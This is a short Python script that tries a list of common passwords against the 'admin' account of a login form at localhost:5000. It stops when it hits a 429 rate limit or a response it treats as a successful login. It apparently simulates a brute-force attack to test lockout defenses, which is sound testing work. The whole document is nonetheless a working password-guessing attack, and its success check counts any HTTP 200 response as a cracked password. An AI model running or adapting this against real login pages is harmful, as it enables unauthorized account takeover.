import requests
def brute_force_sim(url, username, wordlist):
    for pwd in wordlist:
        r = requests.post(url,
                          data={'username': username, 'password': pwd},
                          timeout=5)
        if r.status_code == 429:
            print("[!] Rate limit triggered: Too many failed attempts.")
            print("[!] Further login attempts were blocked.")
            return None
        elif "Welcome" in r.text or r.status_code == 200:
            print(f"[+] Found: {username}:{pwd}")
            return pwd
        else:
            print(f"[-] Failed: {pwd}")
    return None

wordlist = ["password", "admin","qwerty", "letmein", "123456", "wrongpass"]
brute_force_sim("http://localhost:5000/login", "admin", wordlist)